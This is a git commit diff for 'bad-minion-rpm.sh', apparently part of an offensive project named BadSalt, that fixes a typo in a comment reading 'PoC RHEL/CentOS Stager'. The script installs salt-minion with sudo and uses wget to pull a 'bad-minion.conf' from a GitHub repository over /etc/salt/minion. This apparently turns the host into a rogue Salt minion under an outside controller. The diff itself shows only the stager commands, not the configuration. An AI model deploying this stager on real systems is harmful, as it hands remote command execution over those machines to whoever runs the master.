fd2bb0e134c809d45f878cb3f31fc05b87fc5c83
Casey Erdmann <14339392+3ndG4me@users.noreply.github.com>
2019-02-05 16:17:52 -0500

    Update bad-minion-rpm.sh

--- bad-minion-rpm.sh
+++ bad-minion-rpm.sh
@@ -1,4 +1,4 @@
-# PoC RHEL/CentOS Stagerb
+# PoC RHEL/CentOS Stager
 sudo yum install https://repo.saltstack.com/yum/redhat/salt-repo-latest.el7.noarch.rpm
 sudo yum install salt-minion
 wget -O - https://raw.githubusercontent.com/3ndG4me/BadSalt/master/bad-minion.conf > /etc/salt/minion
